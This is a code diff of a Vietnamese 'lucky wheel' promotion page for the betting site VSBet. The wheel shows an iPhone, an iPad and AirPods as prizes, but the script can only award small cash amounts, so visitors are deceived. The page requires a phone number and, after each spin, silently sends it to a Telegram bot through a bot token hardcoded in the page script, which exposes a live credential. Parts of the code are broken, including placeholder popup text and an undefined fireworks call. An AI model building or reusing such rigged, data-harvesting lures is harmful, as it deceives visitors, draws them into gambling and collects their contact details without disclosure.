@@ -1,10 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Vòng Quay May Mắn</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -14,47 +16,58 @@
             min-height: 100vh;
             padding: 20px;
         }
-        
+
+        body {
+            background: url("../images/bg/bg1.png") no-repeat center center/cover;
+            color: #FFF;
+        }
+
         h2 {
-            color: #ff4081;
-            text-shadow: 1px 1px 3px rgba(0,0,0,0.2);
+            color: #ffffff;
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.2);
             font-size: 2.5rem;
             margin-bottom: 20px;
+            margin-top: 130px;
         }
-        
+
         .wheel-container {
             position: relative;
             width: 350px;
             height: 350px;
             margin: 30px auto;
         }
-        
+
         #wheel {
             width: 100%;
             height: 100%;
             border-radius: 50%;
             border: 15px solid #ffd700;
             position: relative;
-            box-shadow: 0 0 20px rgba(0,0,0,0.2);
-            background: conic-gradient(
-                #ffd700 0% 16.6%,     /* Giải nhất */
-                #ff8c00 16.6% 33.2%,  /* Giải nhì */
-                #ff4500 33.2% 49.8%,  /* Giải ba */
-                #4caf50 49.8% 66.4%,  /* Giải 4 */
-                #2196f3 66.4% 83%,    /* Giải 5 */
-                #9c27b0 83% 100%      /* Giải 6 */
-            );
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+            background: conic-gradient(#ffd700 0% 16.6%,
+                    /* Giải nhất */
+                    #ff8c00 16.6% 33.2%,
+                    /* Giải nhì */
+                    #ff4500 33.2% 49.8%,
+                    /* Giải ba */
+                    #4caf50 49.8% 66.4%,
+                    /* Giải 4 */
+                    #2196f3 66.4% 83%,
+                    /* Giải 5 */
+                    #9c27b0 83% 100%
+                    /* Giải 6 */
+                );
             transition: transform 4s cubic-bezier(0.33, 1, 0.68, 1);
             overflow: hidden;
         }
-        
+
         .wheel-item {
             position: absolute;
             width: 50%;
             height: 50%;
-            transform-origin: 100% 100%;
-            left: 0;
-            top: 0;
+            transform-origin: 90% 100%;
+            left: 16px;
+            top: 4px;
             text-align: center;
             display: flex;
             flex-direction: column;
@@ -64,14 +77,14 @@
             box-sizing: border-box;
             color: white;
             font-weight: bold;
-            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.5);
         }
-        
+
         .wheel-item i {
             font-size: 2rem;
             margin-bottom: 10px;
         }
-        
+
         .pointer {
             position: absolute;
             top: -20px;
@@ -81,16 +94,16 @@
             height: 0;
             border-left: 25px solid transparent;
             border-right: 25px solid transparent;
-            border-top: 50px solid #ff4081;
+            border-top: 40px solid #ff6200;
             z-index: 10;
-            filter: drop-shadow(0 0 5px rgba(0,0,0,0.3));
+            filter: drop-shadow(0 0 5px rgba(0, 0, 0, 0.3));
         }
-        
+
         #spinBtn {
             padding: 15px 40px;
             font-size: 20px;
             cursor: pointer;
-            background: linear-gradient(to right, #ff4081, #ff6b6b);
+            background: linear-gradient(to right, #ffa340, #ff6b6b);
             border: none;
             color: white;
             border-radius: 50px;
@@ -100,44 +113,56 @@
             font-weight: bold;
             text-transform: uppercase;
             letter-spacing: 1px;
+            margin-left: 30px;
         }
-        
+
         #spinBtn:hover {
             transform: translateY(-3px);
             box-shadow: 0 8px 20px rgba(255, 64, 129, 0.6);
         }
-        
+
         #spinBtn:active {
             transform: translateY(1px);
         }
-        
-        .popup, .phone-popup {
+
+        .popup,
+        .phone-popup {
             position: fixed;
-            top: 0; left: 0;
-            width: 100vw; height: 100vh;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
             background: rgba(0, 0, 0, 0.6);
             display: flex;
             align-items: center;
             justify-content: center;
             z-index: 999;
         }
-        
-        .popup-content, .phone-content {
+
+        .popup-content,
+        .phone-content {
             background: white;
             padding: 30px;
             border-radius: 15px;
             text-align: center;
             max-width: 400px;
             width: 90%;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
             animation: popup 0.4s ease-out;
         }
-        
+
         @keyframes popup {
-            from { transform: scale(0.8); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
+            from {
+                transform: scale(0.8);
+                opacity: 0;
+            }
+
+            to {
+                transform: scale(1);
+                opacity: 1;
+            }
         }
-        
+
         .close-btn {
             margin-top: 20px;
             padding: 10px 25px;
@@ -149,12 +174,12 @@
             font-weight: bold;
             transition: all 0.3s ease;
         }
-        
+
         .close-btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 5px 10px rgba(0,0,0,0.2);
+            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
         }
-        
+
         input[type="text"] {
             padding: 12px 15px;
             width: 80%;
@@ -165,198 +190,442 @@
             outline: none;
             transition: all 0.3s;
         }
-        
+
         input[type="text"]:focus {
             border-color: #ff4081;
             box-shadow: 0 0 8px rgba(255, 64, 129, 0.4);
         }
+
+        .box4-img1 {
+            position: fixed;
+            top: 50%;
+            transform: translateY(-50%);
+            left: -60px;
+        }
+
+        .box4-img2 {
+            position: fixed;
+            top: 50%;
+            transform: translateY(-50%) scale(0.9);
+            right: 0px;
+        }
+
+        ul {
+            list-style: none;
+        }
+
+        a {
+            text-decoration: none;
+        }
+
+        .mb {
+            display: none;
+        }
+        h3 {
+            color: #000;
+        }
+
+        @media (max-width: 768px) {
+            .pc {
+                display: none;
+            }
+
+            .mb {
+                display: block;
+            }
+
+            .wheel-container {
+                margin-left: 0px;
+            }
+
+            h2 {
+                color: #ffffff;
+                text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.2);
+                font-size: 30px;
+                margin-bottom: 20px;
+                margin-top: 80px;
+            }
+
+            #spinBtn {
+                margin-left: 0px;
+            }
+        }
         
-        .logo {
-            width: 100px;
+        .popup-content {
+            background: url("https://png.pngtree.com/thumb_back/fh260/background/20190223/ourmid/pngtree-red-festive-awards-party-board-board-backgroundawards-partyfireworksdrumred-image_77330.jpg") no-repeat center center/cover;
+            color: #000;
+            padding: 30px;
+            border-radius: 15px;
+        }
+        .popup-content p, .popup-content h3 {
+            color: #FFF;
+        }
+        .popup-content img {
+            width: 400px;
+        }
+        .container-box {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            background-size: cover;
+        }
+
+        .box {
+            flex: 1;
+            margin: 0 10px;
+            padding: 20px;
+            background-color: #b97022;
+            border-radius: 10px;
+            border: 1px solid #ff830f;
+            text-align: center;
+        }
+
+        .box  h3 {
+            color: #FFF;
+            font-size: 18px;
+            font-weight: bold;
             margin-bottom: 20px;
         }
+
+        .box .contact {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 10px;
+        }
+
+        .box .contact img {
+            width: 30px;
+            height: 30px;
+            margin-right: 10px;
+        }
+
+        .box .contact span {
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .box .conditions {
+            text-align: left;
+            font-size: 14px;
+            line-height: 1.8;
+        }
+
+        .box .conditions span {
+            color: #ff9d00;
+            font-weight: bold;
+        }
+        @media (max-width: 768px) {
+            .container-box {
+                flex-direction: column-reverse;
+                gap: 20px;
+            }
+            .popup-content img {
+                width: 320px;
+            }
+            .popup-content {
+                width: 80%;
+            }
+        }
     </style>
+
+    <link rel="stylesheet" href="./css/header.css">
 </head>
+
 <body>
-
-<h2>Vòng Quay May Mắn</h2>
-<div class="wheel-container">
-    <div id="wheel"></div>
-    <div class="pointer"></div>
-</div>
-<button id="spinBtn">Quay</button>
-
-<!-- Popup trúng thưởng -->
-<div id="resultPopup" class="popup" style="display:none;">
-    <div class="popup-content">
-        <h3 id="prizeText"></h3>
-        <button class="close-btn" onclick="document.getElementById('resultPopup').style.display='none'">Đóng</button>
+    <header data-aos="fade-down" data-aos-easing="linear" data-aos-duration="800">
+        <div class="container">
+            <div class="header-container">
+                <div class="header-t">
+                    <div class="logo">
+                        <img src="./images/Logo.png" alt="">
+                    </div>
+                    <div class="header-bt pc">
+                        <nav class="list-menu">
+                            <ul>
+                                <li><a href="https://vsbet80.com/">Trang chủ</a></li>
+                                <li><a href="/colatv-live.html">Trực tiếp bóng đá</a></li>
+                                <li><a href="#ty-so-bong-da">Tỷ số bóng đá</a></li>
+                                <li><a href="#hoat-dong-xa-hoi">Hoạt động xã hội</a></li>
+                                <li><a href="#tai-tro">Tài trợ</a></li>
+                                <li><a href="https://vsbet80.com/customerService">Liên hệ</a></li>
+                            </ul>
+                        </nav>
+                    </div>
+                    <div class="pc">
+                        <a href="https://vsbet80.com/login" class="btn pc">Đăng nhập</a>
+                        <a href="https://vsbet80.com/registered" class="btn pc">Đăng ký</a>
+                    </div>
+                    <div class="menu mb">
+                        <img src="./images/menu.svg" alt="">
+                    </div>
+                </div>
+                <div class="bg-menu"></div>
+                <div class="header-bt mb header-bt-mb">
+                    <div class="close mb">
+                        <img src="./images/close.svg" alt="">
+                    </div>
+                    <div class="mb">
+                        <div class="logo-mb">
+                            <img src="./images/Logo.png" alt="">
+                        </div>
+                        <div class="box-btn">
+                            <a href="https://vsbet80.com/login" class="btn mb">Đăng nhập</a>
+                            <a href="https://vsbet80.com/registered" class="btn mb">Đăng ký</a>
+                        </div>
+                    </div>
+                    <nav class="list-menu">
+                        <ul>
+                            <li><a href="https://vsbet80.com/">Trang chủ</a></li>
+                            <li><a href="/colatv-live.html">Trực tiếp bóng đá</a></li>
+                            <li><a href="#ty-so-bong-da">Tỷ số bóng đá</a></li>
+                            <li><a href="#hoat-dong-xa-hoi">Hoạt động xã hội</a></li>
+                            <li><a href="#tai-tro">Tài trợ</a></li>
+                            <li><a href="https://vsbet80.com/customerService">Liên hệ</a></li>
+                        </ul>
+                    </nav>
+                </div>
+            </div>
+        </div>
+    </header>
+    <div class="box4-img1 pc">
+        <img src="./images/bg/ct2.png" alt="">
     </div>
-</div>
-
-<!-- Popup nhập số điện thoại -->
-<div id="phonePopup" class="phone-popup" style="display:none;">
-    <div class="phone-content">
-        <img src="/api/placeholder/100/100" alt="Gift" class="logo">
-        <h3>Nhập số điện thoại để tham gia</h3>
-        <input type="text" id="phoneNumber" placeholder="Nhập số điện thoại (10 số)">
-        <br>
-        <button class="close-btn" onclick="savePhoneNumber()">Xác nhận</button>
+    <div class="box4-img2 pc">
+        <img src="./images/bg/ct4.png" alt="">
     </div>
-</div>
+    <h2>Vòng Quay May Mắn</h2>
+    <div class="wheel-container">
+        <div id="wheel"></div>
+        <div class="pointer"></div>
+    </div>
+    <button id="spinBtn">Quay</button>
 
-<script>
-    const prizes = [
-        { label: "Iphone 16 Pro Max", win: false, icon: "https://pngimg.com/d/iphone_12_PNG23.png" },
-        { label: "388,000 VND", win: true, chance: 0.10, icon: "money-bill-wave" },
-        { label: "iPad M4", win: false, icon: "tablet-screen-button" },
-        { label: "188,000 VND", win: true, chance: 0.30, icon: "money-bill" },
-        { label: "AirPods 3", win: false, icon: "https://traidepbaniphone.com/upload/product/airpods-3-thumb-650x650-4985.png" },
-        { label: "88,000 VND", win: true, chance: 0.60, icon: "coins" },
-    ];
+    <!-- Popup trúng thưởng -->
+    <div id="resultPopup" class="popup" style="display:flex;">
+        <div class="popup-content">
+            <img src="./images/win.png" alt="">
+            <h3 id="prizeText">dfgdfgdfgf</h3>
+            <p>Liên hệ chăm sóc khách hàng để được nhận thưởng</p>
+            <button class="close-btn"
+                onclick="document.getElementById('resultPopup').style.display='none'">Đóng</button>
+        </div>
+    </div>
 
-    const segmentAngle = 360 / prizes.length;
-    let angle = 0;
-    let isSpinning = false;
+    <!-- Popup nhập số điện thoại -->
+    <div id="phonePopup" class="phone-popup" style="display:none;">
+        <div class="phone-content">
+            <img style="width: 100%;" src="https://img.gotit.vn/compress/gotit_website/1693986508_mUuqt.png" alt="Gift" class="logo">
+            <h3 style="color: #000">Nhập số điện thoại để tham gia</h3>
+            <input type="text" id="phoneNumber" placeholder="Xin mời nhập số điện thoại">
+            <br>
+            <button class="close-btn" onclick="savePhoneNumber()">Xác nhận</button>
+        </div>
+    </div>
 
-    // Tạo giao diện các phần thưởng
-    function createWheelItems() {
-        const wheel = document.getElementById('wheel');
-        prizes.forEach((prize, index) => {
-            const item = document.createElement('div');
-            item.className = 'wheel-item';
-            item.style.transform = `rotate(${index * segmentAngle}deg)`;
-            item.innerHTML = `
-                <img src="${prize.icon}" alt="${prize.label}" style="width: 50px; height: 50px;">
-                <i class="fas fa-${prize.icon}"></i>
-                <span>${prize.label}</span>
-            `;
-            wheel.appendChild(item);
-        });
-    }
+    <div class="container-box">
+        <div class="box">
+            <h3>
+                LIÊN HỆ CSKH VSBET
+            </h3>
+            <div class="contact">
+                <img alt="Telegram logo" height="30"
+                    src="./images/icon/telegram.svg"
+                    width="30" />
+                <span>
+                    @vsthethao
+                </span>
+            </div>
+            <div class="contact">
+                <img alt="Zalo logo" src="./images/icon/7044033_zalo_icon.svg" />
+                <span>
+                    +84 862 327 361
+                </span>
+            </div>
+        </div>
+        <div class="box">
+            <h3>
+                ĐIỀU KIỆN THAM GIA
+            </h3>
+            <div class="conditions">
+                <p>
+                    1. Áp dụng với thành viên lần đầu tham gia
+                    <span>
+                        VSBet.
+                    </span>
+                </p>
+                <p>
+                    2. Mỗi số điện thoại, IP thiết bị mạng, thẻ ngân hàng, mỗi một người sẽ chỉ được trúng thưởng 01 lần duy nhất.
+                </p>
+            </div>
+        </div>
+        <div class="box pc">
+            <h3>
+                LIÊN HỆ CSKH VSBET
+            </h3>
+            <div class="contact">
+                <img alt="Telegram logo" height="30"
+                    src="./images/icon/telegram.svg"
+                    width="30" />
+                <span>
+                    @vsthethao
+                </span>
+            </div>
+            <div class="contact">
+                <img alt="Zalo logo" src="./images/icon/7044033_zalo_icon.svg" />
+                <span>
+                    +84 862 327 361
+                </span>
+            </div>
+        </div>
+    </div>
 
-    // Kiểm tra xem có thể sử dụng localStorage và sessionStorage không
-    let canUseStorage = false;
-    try {
-        localStorage.setItem("test", "test");
-        localStorage.removeItem("test");
-        sessionStorage.setItem("test", "test");
-        sessionStorage.removeItem("test");
-        canUseStorage = true;
-    } catch (e) {
-        console.log("Storage không khả dụng, sử dụng biến trong bộ nhớ.");
-    }
-
-    // Biến lưu số điện thoại và danh sách người đã quay trong bộ nhớ (fallback)
-    let userPhone = "";
-    let spunUsers = [];
-
-    // Kiểm tra người dùng đã quay chưa từ localStorage nếu có thể
-    if (canUseStorage) {
+    
+    <script>
+        const prizes = [
+            { label: "IP16 ProMax", win: false, icon: "https://pngimg.com/d/iphone_12_PNG23.png" },
+            { label: "388K", win: true, chance: 0.10, icon: "https://png.pngtree.com/png-clipart/20240512/original/pngtree-cash-paper-banknote-money-cash-heap-pile-and-stack-money-png-image_15075383.png" },
+            { label: "iPad M4", win: false, icon: "https://cdsassets.apple.com/live/7WUAS350/images/tech-specs/ipad-pro-11-inch-13-inch.png" },
+            { label: "188K", win: true, chance: 0.30, icon: "https://png.pngtree.com/png-clipart/20240512/original/pngtree-cash-paper-banknote-money-cash-heap-pile-and-stack-money-png-image_15075383.png" },
+            { label: "AirPods 3", win: false, icon: "https://traidepbaniphone.com/upload/product/airpods-3-thumb-650x650-4985.png" },
+            { label: "88K", win: true, chance: 0.60, icon: "https://png.pngtree.com/png-clipart/20240512/original/pngtree-cash-paper-banknote-money-cash-heap-pile-and-stack-money-png-image_15075383.png" },
+        ];
+    
+        const segmentAngle = 360 / prizes.length;
+        let angle = 0;
+        let isSpinning = false;
+    
+        function createWheelItems() {
+            const wheel = document.getElementById('wheel');
+            prizes.forEach((prize, index) => {
+                const item = document.createElement('div');
+                item.className = 'wheel-item';
+                item.style.transform = `rotate(${index * segmentAngle}deg)`;
+                item.innerHTML = `
+                    <img src="${prize.icon}" alt="${prize.label}" style="width: 60px;">
+                    <span>${prize.label}</span>
+                `;
+                wheel.appendChild(item);
+            });
+        }
+    
+        let canUseStorage = false;
         try {
-            userPhone = sessionStorage.getItem("tempPhone") || "";
-            spunUsers = JSON.parse(localStorage.getItem("spunUsers") || "[]");
+            localStorage.setItem("test", "test");
+            localStorage.removeItem("test");
+            sessionStorage.setItem("test", "test");
+            sessionStorage.removeItem("test");
+            canUseStorage = true;
         } catch (e) {
-            console.log("Lỗi khi đọc dữ liệu từ storage:", e);
+            console.log("Storage không khả dụng.");
         }
-    }
-
-    // Hiển thị popup nhập số điện thoại khi tải trang
-    window.onload = function () {
-        createWheelItems();
-        if (!userPhone) {
-            document.getElementById("phonePopup").style.display = "flex";
-        }
-    };
-
-    // Lưu số điện thoại
-    function savePhoneNumber() {
-        const phoneInput = document.getElementById("phoneNumber").value.trim();
-        if (!/^0\d{9}$/.test(phoneInput)) {
-            alert("Vui lòng nhập đúng số điện thoại (10 số bắt đầu bằng 0)");
-            return;
-        }
-        
-        userPhone = phoneInput;
-        
-        // Lưu vào sessionStorage nếu có thể
+    
+        let userPhone = "";
+        let spunUsers = [];
+    
         if (canUseStorage) {
             try {
-                sessionStorage.setItem("tempPhone", userPhone);
+                userPhone = sessionStorage.getItem("tempPhone") || "";
+                spunUsers = JSON.parse(localStorage.getItem("spunUsers") || "[]");
             } catch (e) {
-                console.log("Không thể lưu vào sessionStorage:", e);
+                console.log("Lỗi đọc storage:", e);
             }
         }
-        
-        document.getElementById("phonePopup").style.display = "none";
-    }
-
-    // Xử lý nút quay
-    document.getElementById("spinBtn").addEventListener("click", spin);
-
-    function spin() {
-        if (isSpinning) return;
-        isSpinning = true;
-
-        if (!userPhone) {
-            alert("Bạn chưa nhập số điện thoại!");
-            isSpinning = false;
-            return;
-        }
-
-        if (spunUsers.includes(userPhone)) {
-            alert("Số điện thoại này đã quay rồi!");
-            isSpinning = false;
-            return;
-        }
-
-        // Chỉ chọn các giải tiền (win=true)
-        const winningPrizes = prizes.filter(p => p.win);
-        const rand = Math.random();
-        let cumulative = 0;
-        let selectedPrize = null;
-
-        for (let i = 0; i < winningPrizes.length; i++) {
-            cumulative += winningPrizes[i].chance;
-            if (rand < cumulative) {
-                selectedPrize = winningPrizes[i];
-                break;
+    
+        window.onload = function () {
+            createWheelItems();
+            if (!userPhone) {
+                document.getElementById("phonePopup").style.display = "flex";
             }
+        };
+    
+        function savePhoneNumber() {
+            const phoneInput = document.getElementById("phoneNumber").value.trim();
+            if (!/^0\d{9}$/.test(phoneInput)) {
+                alert("Vui lòng nhập đúng số điện thoại (10 số bắt đầu bằng 0)");
+                return;
+            }
+    
+            userPhone = phoneInput;
+            sessionStorage.setItem("tempPhone", phoneInput);
+            document.getElementById('phonePopup').style.display = 'none';
         }
-
-        // Tìm index của giải thưởng đã chọn trong mảng prizes gốc
-        const selectedPrizeIndex = prizes.findIndex(p => p.label === selectedPrize.label);
-        
-        // Tính góc quay dựa trên vị trí của mũi tên
-        const spins = 5; // Số vòng quay hoàn chỉnh
-        
-        // Góc quay = số vòng * 360 + góc để mũi tên chỉ vào phần tử được chọn
-        const prizeAngle = selectedPrizeIndex * segmentAngle;
-        angle = spins * 360 + prizeAngle;
-        
-        document.getElementById("wheel").style.transform = `rotate(-${angle}deg)`;
-
-        setTimeout(() => {
-            document.getElementById("prizeText").textContent = `Bạn đã trúng: ${selectedPrize.label}`;
-            document.getElementById("resultPopup").style.display = "flex";
-
-            // Thêm số điện thoại vào danh sách đã quay
-            spunUsers.push(userPhone);
-            
-            // Lưu vào localStorage nếu có thể sử dụng
-            if (canUseStorage) {
-                try {
-                    localStorage.setItem("spunUsers", JSON.stringify(spunUsers));
-                    console.log("Đã lưu số điện thoại vào danh sách đã quay.");
-                } catch (e) {
-                    console.log("Không thể lưu vào localStorage:", e);
+    
+        document.getElementById("spinBtn").addEventListener("click", spin);
+    
+        function spin() {
+            if (isSpinning) return;
+            isSpinning = true;
+    
+            if (!userPhone) {
+                alert("Bạn chưa nhập số điện thoại!");
+                isSpinning = false;
+                return;
+            }
+    
+            if (spunUsers.includes(userPhone)) {
+                alert("Số điện thoại này đã quay rồi!");
+                isSpinning = false;
+                return;
+            }
+    
+            const winningPrizes = prizes.filter(p => p.win);
+            const rand = Math.random();
+            let cumulative = 0;
+            let selectedPrize = null;
+    
+            for (let i = 0; i < winningPrizes.length; i++) {
+                cumulative += winningPrizes[i].chance;
+                if (rand < cumulative) {
+                    selectedPrize = winningPrizes[i];
+                    break;
                 }
             }
-            
-            isSpinning = false;
-        }, 4000);
-    }
-</script>
-
+    
+            const selectedPrizeIndex = prizes.findIndex(p => p.label === selectedPrize.label);
+            const spins = 5;
+            const prizeAngle = selectedPrizeIndex * segmentAngle;
+            angle = spins * 360 + prizeAngle;
+    
+            document.getElementById("wheel").style.transform = `rotate(-${angle}deg)`;
+    
+            setTimeout(() => {
+                document.getElementById("prizeText").textContent = `Bạn đã trúng: ${selectedPrize.label}`;
+                document.getElementById("resultPopup").style.display = "flex";
+                const container = document.querySelector('.fireworks')
+                const fireworks = new Fireworks.default(container)
+                fireworks.start()
+                spunUsers.push(userPhone);
+                if (canUseStorage) {
+                    try {
+                        localStorage.setItem("spunUsers", JSON.stringify(spunUsers));
+                    } catch (e) {
+                        console.log("Lỗi lưu localStorage:", e);
+                    }
+                }
+    
+                // Gửi Telegram tại đây
+                const botToken = '7574007463:AAFxrMcurK-ix2BQB51Sp1__f5iEN-Bs424';
+                const chatId = '2116572006';
+                const message = `🎯 Người dùng ${userPhone} vừa quay và trúng: ${selectedPrize.label}`;
+    
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                }).then(res => res.json())
+                  .then(data => console.log("Gửi Telegram thành công:", data))
+                  .catch(error => console.error("Lỗi gửi Telegram:", error));
+    
+                isSpinning = false;
+            }, 4000);
+        }
+    </script>
+    <script src="./js/main.js"></script>
 </body>
+
 </html>
